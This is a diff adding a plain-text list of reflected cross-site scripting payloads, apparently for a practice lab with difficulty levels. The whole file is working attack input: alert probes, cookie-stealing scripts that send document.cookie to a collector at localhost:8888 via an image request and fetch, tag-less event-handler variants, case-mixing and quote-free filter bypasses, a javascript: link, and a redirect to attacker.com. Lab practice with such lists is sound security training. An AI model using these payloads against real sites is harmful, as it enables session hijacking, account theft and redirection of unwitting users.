@@ -1,0 +1,29 @@
+# XSS Reflected - Payloads (payloads.txt)
+
+# --- Basic ---
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+
+# --- Cookie stealing ---
+<script>new Image().src='http://localhost:8888/?c='+document.cookie</script>
+<script>fetch('http://localhost:8888/?c='+document.cookie)</script>
+
+# --- No <script> tag ---
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+
+# --- Case bypass (Medium) ---
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x ONERROR=alert(1)>
+
+# --- No quotes needed ---
+<img src=x onerror=alert`1`>
+
+# --- href based ---
+<a href="javascript:alert(1)">Click me</a>
+
+# --- Redirect victim ---
+<script>document.location='http://attacker.com'</script>
